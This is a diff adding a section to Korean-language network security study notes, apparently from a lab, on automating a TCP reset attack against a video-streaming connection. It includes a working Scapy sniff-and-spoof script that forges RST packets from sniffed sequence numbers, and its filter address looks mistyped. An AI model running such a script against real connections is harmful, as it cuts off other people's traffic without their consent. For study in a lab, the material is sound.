@@ -266,4 +266,16 @@ ls(pkt)
 send(pkt, verbose=0)
 ```
 ## 비디오-streaming 연결에 TCP 리셋
-- 
+- 비디오-streaming 연결에서는 순서 번호가 매우 빠르게 증가 => 공격을 자동화
+-> 스니핑 - 후 -입력 방식에서 패킷을 스니핑하고, 순서번호와 필수 매개 변수를 확인후 자동으로 스푸핑된 TCP RST 패킷을 보냄(Sniff-and-spoof방식)
+```python
+#!/usr/bin/python3
+from scapy.all import *
+def spoof_tcp(pkt):
+	IPLayer = IP(dst="10.0.2.68", src=pkt[IP].dst)
+	TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
+	spoofpkt = IPLayer/TCPLayer
+	send(spoofpkt, verbose=0)
+	
+pkt=sniff(filter='tcp and src host 10.2.68', prn=spoof_tcp)
+```
